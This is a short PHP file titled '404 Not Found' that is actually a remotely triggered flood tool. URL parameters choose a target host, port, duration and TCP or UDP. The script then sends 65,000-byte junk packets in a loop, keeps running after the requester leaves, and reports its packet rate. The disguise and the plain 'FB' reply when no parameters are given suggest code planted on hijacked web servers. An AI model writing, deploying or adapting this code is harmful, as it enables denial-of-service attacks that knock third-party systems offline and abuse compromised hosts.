<Title> 404 Not Found </Title> 
<?php
    ignore_user_abort(TRUE);
    set_time_limit(0);
if (isset($_GET['type'])) {
        if ($_GET['type'] == 'syn') {
                $schema = 'tcp://';
        }else{
                $schema = 'udp://';
        }
        } else {
        $schema = 'udp://';
        }
if(isset($_GET['host'])&&is_numeric($_GET['time'])){
        $out='';
    $pakits = 0;
    $exec_time = $_GET['time'];
    $time = time();
    $max_time = $time+$exec_time;
    $host = $_GET['host'];
    for($i=0;$i<65000;$i++){
            $out .= 'X';
    }
    while(1){
    $pakits++;
            if(time() > $max_time){
                    break;
            }
                        if ($_GET['port'] == "rand") {
            $rand = rand(1,65000);
                        }else{
                        $rand = $_GET['port']; }
            $fp = fsockopen($schema.$host, $rand, $errno, $errstr, 5);
            if($fp){
                    fwrite($fp, $out);
                    fclose($fp);
            }
    }
    echo "<br><b>Flood</b><br>Completed with $pakits (" . round((($pakits*65)/1024)/$exec_time, 2) . " MB per second) packets averaging ". round($pakits/$exec_time, 2) . " packets per second \n";

}else{ echo 'FB';

}

?>